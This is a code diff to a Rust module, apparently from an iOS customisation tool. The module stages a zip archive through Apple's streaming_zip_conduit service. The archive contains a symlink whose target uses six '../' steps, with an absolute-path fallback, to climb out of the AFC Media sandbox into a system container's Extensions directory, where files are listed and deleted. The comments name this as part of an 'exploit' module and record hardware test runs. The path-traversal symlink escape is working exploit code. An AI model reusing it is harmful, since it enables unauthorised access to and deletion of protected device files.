@@ -23,19 +23,25 @@
 //! service (OpNotSupported, hardware log run #107), so this module
 //! plants its link the flash way instead: a StreamingZip archive whose
 //! symlink entry streaming_zip_conduit extracts into a scratch Media
-//! subdir, then an AFC rename moves the extracted symlink to the Media
-//! root — the geometry its ../../../ target is calibrated for (after
-//! its sync, the flash flow's payload writes go through a root-level
-//! link of exactly this shape).
+//! subdir. The extracted link is used in place, at
+//! <source>/p0/p1/p2/link — an AFC rename to the Media root is refused
+//! (InvalidArg, hardware log run #108; the flash flow never renames
+//! its link either, its root-level airlift-link is landed by the ATC
+//! sync itself), so the archive's symlink target is computed for the
+//! staged depth instead: six ../ to climb from the link's directory
+//! to /var, then the container tail. If that relative target does not
+//! traverse, an absolute-target archive is staged and tried in the
+//! same session before the failure is reported.
 //!
 //!   1. Open an RSD tunnel (same idevice_ffi tunnel_provider primitives
 //!      and host strategy as poster_refresh::connect_rsd: last working
 //!      route first, then the known loopback-VPN gateway defaults;
 //!      RemoteXPC with raw RPPairing fallback per host).
 //!   2. Connect the AFC service from the RSD handshake.
-//!   3. Plant a temporary symlink `cocowall-store-<token>` at the Media
-//!      root pointing at the store's Extensions directory (StreamingZip
-//!      staging + AFC rename, as above).
+//!   3. Plant a temporary symlink inside a scratch Media subdir
+//!      (`cocowall-src-<token>/p0/p1/p2/link`) pointing at the store's
+//!      Extensions directory (StreamingZip staging, as above; no
+//!      rename — the link is used at its staged depth).
 //!   4a. LIST: enumerate extension dirs, then each `descriptors/` dir;
 //!      per descriptor read the small identifier text file and walk
 //!      versions/<v>/contents/ for the `<name>.wallpaper` package name
@@ -49,8 +55,8 @@
 //!      into Media as an airlift-quarantine-<token> copy. A fresh-
 //!      connection commit audit must re-confirm every deleted path
 //!      absent before it counts as deleted.
-//!   5. Remove the temporary symlink and its staging directory (best
-//!      effort, always).
+//!   5. Remove the staging directory (the temporary symlink lives
+//!      inside it; best effort, always).
 //!
 //! Results come back as JSON in an out parameter, with a machine-readable
 //! status string like the other FFIs. Failures are reported, never
@@ -373,10 +379,123 @@ async fn connect_rsd(
 
 struct StoreSession {
     afc: AfcClient,
+    /// Path of the planted symlink, at its staged depth inside the
+    /// scratch subdir (<source_name>/p0/p1/p2/link).
     link_name: String,
     /// Scratch Media subdir the staging archive was extracted into;
-    /// removed on close together with the root-level symlink.
+    /// the symlink lives inside it, so removing the subdir on close
+    /// removes both.
     source_name: String,
+}
+
+/// Upload one staging archive through streaming_zip_conduit, which
+/// extracts it into the Media subdir `source` on receipt.
+async fn upload_stage_archive(
+    adapter: &mut AdapterHandle,
+    handshake: &mut RsdHandshake,
+    source: &str,
+    archive: &[u8],
+    logger: &PSLogger,
+) -> Result<(), String> {
+    let mut zip_stream = connect_service_rsd(
+        adapter,
+        handshake,
+        "com.apple.streaming_zip_conduit",
+        logger,
+    )
+    .await?;
+    {
+        let mut zip_init_dict = plist::Dictionary::new();
+        zip_init_dict.insert(
+            "MediaSubdir".to_string(),
+            plist::Value::String(source.to_string()),
+        );
+        let mut init_buf = Vec::new();
+        plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(zip_init_dict))
+            .map_err(|e| format!("encode MediaSubdir: {e}"))?;
+        let init_len_bytes = (init_buf.len() as u32).to_be_bytes();
+        zip_stream
+            .write_all(&init_len_bytes)
+            .await
+            .map_err(|e| format!("write MediaSubdir length: {e}"))?;
+        zip_stream
+            .write_all(&init_buf)
+            .await
+            .map_err(|e| format!("write MediaSubdir body: {e}"))?;
+        zip_stream
+            .flush()
+            .await
+            .map_err(|e| format!("flush: {e}"))?;
+        zip_stream
+            .write_all(archive)
+            .await
+            .map_err(|e| format!("write archive bytes: {e}"))?;
+        zip_stream
+            .flush()
+            .await
+            .map_err(|e| format!("flush: {e}"))?;
+        let mut resp_len_buf = [0u8; 4];
+        zip_stream
+            .read_exact(&mut resp_len_buf)
+            .await
+            .map_err(|e| format!("read zip response length: {e}"))?;
+        let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
+        let mut resp_body = vec![0u8; resp_len];
+        zip_stream
+            .read_exact(&mut resp_body)
+            .await
+            .map_err(|e| format!("read zip response body: {e}"))?;
+    }
+    drop(zip_stream);
+    logger.log(format!(
+        "airlift: airlift.poster_store.stage uploaded=true source={source}"
+    ));
+    Ok(())
+}
+
+/// One staging attempt for the store session: build the archive with
+/// the given symlink target, upload it into a fresh scratch subdir,
+/// verify the extracted link is present, and verify AFC can list
+/// through it. Returns the link path and scratch subdir name. On any
+/// failure the scratch subdir is removed and the error comes back as
+/// a plain message; the caller decides whether another target
+/// variant is worth trying.
+async fn plant_store_link(
+    adapter: &mut AdapterHandle,
+    handshake: &mut RsdHandshake,
+    afc: &mut AfcClient,
+    target: &str,
+    link_target: &str,
+    logger: &PSLogger,
+) -> Result<(String, String), String> {
+    let token = random_token();
+    let source = format!("cocowall-src-{token}");
+
+    let archive = build_delete_archive(target, link_target)
+        .map_err(|e| format!("build staging archive: {e}"))?;
+
+    upload_stage_archive(adapter, handshake, &source, &archive, logger).await?;
+
+    let staged_link = format!("{source}/p0/p1/p2/link");
+    let stage_ok = afc.get_file_info(&source).await.is_ok()
+        && afc.get_file_info(&staged_link).await.is_ok();
+    if !stage_ok {
+        let _ = afc.remove_all(&source).await;
+        return Err(
+            "stage verification failed: extracted symlink not present in Media".to_string(),
+        );
+    }
+    logger.log(format!(
+        "airlift: airlift.poster_store.link.staged name={staged_link} target={link_target}"
+    ));
+
+    // Verify the link resolves before trusting any listing through it.
+    if let Err(e) = afc.list_dir(staged_link.clone()).await {
+        let _ = afc.remove_all(&source).await;
+        return Err(format!("AFC cannot list through the staging symlink: {e:?}"));
+    }
+
+    Ok((staged_link, source))
 }
 
 async fn open_store_session(
@@ -420,156 +539,62 @@ async fn open_store_session(
     // directory, the flash way (module doc): AFC MakeLink is refused
     // by the RSD AFC service (OpNotSupported, hardware log run #107),
     // but streaming_zip_conduit extracts a StreamingZip archive into
-    // Media preserving its symlink entry as a real symlink. The
-    // archive is the same shape the delete staging builds
-    // (build_delete_archive — exploit::build_archive's shape): its
-    // symlink target (../../../<tail>) is calibrated for the link
-    // sitting at the Media root, so after extraction the staged link
-    // is renamed from <source>/p0/p1/p2/link to the Media root as
-    // cocowall-store-<token> — the exact geometry the flash flow's
-    // payload writes go through after its sync.
+    // Media preserving its symlink entry as a real symlink. The link
+    // is used in place at <source>/p0/p1/p2/link — an AFC rename to
+    // the Media root is refused too (InvalidArg, hardware log run
+    // #108), and the flash flow never renames either (its root-level
+    // link is landed by the ATC sync) — so the archive's symlink
+    // target is computed for the staged depth: the link's directory
+    // is Media/<source>/p0/p1/p2, six ../ climb to /var, then the
+    // container tail follows. If the relative target does not
+    // traverse, an absolute-target archive is tried in this same
+    // session before the failure is reported.
     let target = extensions_abs(container_path, struct_version);
-    let token = random_token();
-    let source = format!("cocowall-src-{token}");
-    let link_name = format!("cocowall-store-{token}");
+    let rel_tail = target
+        .strip_prefix("/var/")
+        .unwrap_or_else(|| target.trim_start_matches('/'));
+    let variants: [(&str, String); 2] = [
+        ("relative-depth", format!("../../../../../../{rel_tail}")),
+        ("absolute", target.clone()),
+    ];
 
-    let archive = build_delete_archive(&target).map_err(|e| {
-        (
-            StoreStatus::StageFailed,
-            format!("build staging archive: {e}"),
+    let mut failures: Vec<String> = Vec::new();
+    let mut planted: Option<(String, String)> = None;
+    for (variant, link_target) in &variants {
+        match plant_store_link(
+            &mut adapter,
+            &mut handshake,
+            &mut afc,
+            &target,
+            link_target,
+            logger,
         )
-    })?;
-
-    let mut zip_stream = connect_service_rsd(
-        &mut adapter,
-        &mut handshake,
-        "com.apple.streaming_zip_conduit",
-        logger,
-    )
-    .await
-    .map_err(|e| (StoreStatus::StageFailed, e))?;
-    {
-        let mut zip_init_dict = plist::Dictionary::new();
-        zip_init_dict.insert(
-            "MediaSubdir".to_string(),
-            plist::Value::String(source.clone()),
-        );
-        let mut init_buf = Vec::new();
-        plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(zip_init_dict))
-            .map_err(|e| {
-                (
-                    StoreStatus::StageFailed,
-                    format!("encode MediaSubdir: {e}"),
-                )
-            })?;
-        let init_len_bytes = (init_buf.len() as u32).to_be_bytes();
-        zip_stream
-            .write_all(&init_len_bytes)
-            .await
-            .map_err(|e| {
-                (
-                    StoreStatus::StageFailed,
-                    format!("write MediaSubdir length: {e}"),
-                )
-            })?;
-        zip_stream
-            .write_all(&init_buf)
-            .await
-            .map_err(|e| {
-                (
-                    StoreStatus::StageFailed,
-                    format!("write MediaSubdir body: {e}"),
-                )
-            })?;
-        zip_stream.flush().await.map_err(|e| {
-            (
-                StoreStatus::StageFailed,
-                format!("flush: {e}"),
-            )
-        })?;
-        zip_stream
-            .write_all(&archive)
-            .await
-            .map_err(|e| {
-                (
-                    StoreStatus::StageFailed,
-                    format!("write archive bytes: {e}"),
-                )
-            })?;
-        zip_stream.flush().await.map_err(|e| {
-            (
-                StoreStatus::StageFailed,
-                format!("flush: {e}"),
-            )
-        })?;
-        let mut resp_len_buf = [0u8; 4];
-        zip_stream
-            .read_exact(&mut resp_len_buf)
-            .await
-            .map_err(|e| {
-                (
-                    StoreStatus::StageFailed,
-                    format!("read zip response length: {e}"),
-                )
-            })?;
-        let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
-        let mut resp_body = vec![0u8; resp_len];
-        zip_stream
-            .read_exact(&mut resp_body)
-            .await
-            .map_err(|e| {
-                (
-                    StoreStatus::StageFailed,
-                    format!("read zip response body: {e}"),
-                )
-            })?;
+        .await
+        {
+            Ok(link_and_source) => {
+                logger.log(format!(
+                    "airlift: airlift.poster_store.link.traversable=true variant={variant}"
+                ));
+                planted = Some(link_and_source);
+                break;
+            }
+            Err(msg) => {
+                logger.log(format!(
+                    "airlift: airlift.poster_store.link.traversable=false variant={variant} error={msg}"
+                ));
+                failures.push(format!("[{variant}] {msg}"));
+            }
+        }
     }
-    drop(zip_stream);
-    logger.log(format!(
-        "airlift: airlift.poster_store.stage uploaded=true source={source}"
-    ));
-
-    let staged_link = format!("{source}/p0/p1/p2/link");
-    let stage_ok = afc.get_file_info(&source).await.is_ok()
-        && afc.get_file_info(&staged_link).await.is_ok();
-    if !stage_ok {
-        let _ = afc.remove_all(&source).await;
+    let Some((link_name, source)) = planted else {
         return Err((
             StoreStatus::StageFailed,
-            "stage verification failed: extracted symlink not present in Media".to_string(),
+            format!(
+                "staging symlink did not traverse (target {target}): {}",
+                failures.join("; ")
+            ),
         ));
-    }
-
-    // Move the staged symlink to the Media root, where its
-    // ../../../<tail> target resolves to the store's Extensions dir.
-    afc.rename(staged_link.clone(), link_name.clone())
-        .await
-        .map_err(|e| {
-            (
-                StoreStatus::StageFailed,
-                format!("AFC rename of staged symlink to Media root failed: {e:?}"),
-            )
-        })?;
-    logger.log(format!(
-        "airlift: airlift.poster_store.link.staged name={link_name} target={target}"
-    ));
-
-    // Verify the link resolves before trusting any listing through it.
-    match afc.list_dir(link_name.clone()).await {
-        Ok(_) => {
-            logger.log("airlift: airlift.poster_store.link.traversable=true");
-        }
-        Err(e) => {
-            let _ = afc.remove(link_name.clone()).await;
-            let _ = afc.remove_all(&source).await;
-            return Err((
-                StoreStatus::ListFailed,
-                format!(
-                    "AFC cannot list through the staging symlink (target {target}): {e:?}"
-                ),
-            ));
-        }
-    }
+    };
 
     Ok(StoreSession {
         afc,
@@ -580,13 +605,15 @@ async fn open_store_session(
 
 impl StoreSession {
     async fn close(mut self, logger: &PSLogger) {
-        match self.afc.remove(self.link_name.clone()).await {
+        // The symlink lives inside the staging subdir (no root-level
+        // link exists in this design), so removing the subdir removes
+        // both.
+        match self.afc.remove_all(&self.source_name).await {
             Ok(()) => logger.log("airlift: airlift.poster_store.link.removed=true"),
             Err(e) => logger.log(format!(
                 "airlift: airlift.poster_store.link.removed=false error={e:?}"
             )),
         }
-        let _ = self.afc.remove_all(&self.source_name).await;
     }
 }
 
@@ -809,8 +836,16 @@ fn posix_rel(path: &str, base: &str) -> String {
 /// the descriptors directory + the target path components + a small
 /// payload file (staged but referenced by no book — the delete sync has
 /// exactly two books, link + descriptor).
+///
+/// `link_target` is the symlink's target string, parameterized because
+/// the geometry depends on where the link ends up sitting: the delete
+/// sync's link is landed at the Media root by ATC (three ../ to /,
+/// then the target tail), while the store session's link stays at its
+/// staged depth inside the scratch subdir (six ../ to /var for the
+/// relative variant, or the plain absolute path for the fallback).
 fn build_delete_archive(
     descriptors_dir_abs: &str,
+    link_target: &str,
 ) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
     use zip::{write::FileOptions, CompressionMethod, ZipWriter};
 
@@ -844,11 +879,7 @@ fn build_delete_archive(
         zip.add_directory(*dir, zip_opts(0o040755))?;
     }
 
-    zip.add_symlink(
-        "p0/p1/p2/link",
-        format!("../../../{target_tail}"),
-        zip_opts(0o120777),
-    )?;
+    zip.add_symlink("p0/p1/p2/link", link_target, zip_opts(0o120777))?;
 
     let mut cursor = String::new();
     for component in target_tail.split('/') {
@@ -1116,7 +1147,14 @@ async fn delete_operation(
     let identifiers = vec![link_identifier, descriptor_identifier.clone()];
     let destinations = vec![link_destination.clone(), quarantine_name.clone()];
 
-    let archive = build_delete_archive(descriptors_dir_abs).map_err(|e| format!("build archive: {e}"))?;
+    // The delete sync lands this link at the Media root (airlift-link-*),
+    // so its target keeps the root geometry: three ../ to /, then tail.
+    let root_link_target = format!(
+        "../../../{}",
+        descriptors_dir_abs.trim_start_matches('/')
+    );
+    let archive = build_delete_archive(descriptors_dir_abs, &root_link_target)
+        .map_err(|e| format!("build archive: {e}"))?;
     let books_plist = build_books_plist(&identifiers).map_err(|e| format!("build Books.plist: {e}"))?;
 
     // Stage via streaming_zip_conduit (mirrors exploit::run step 1).
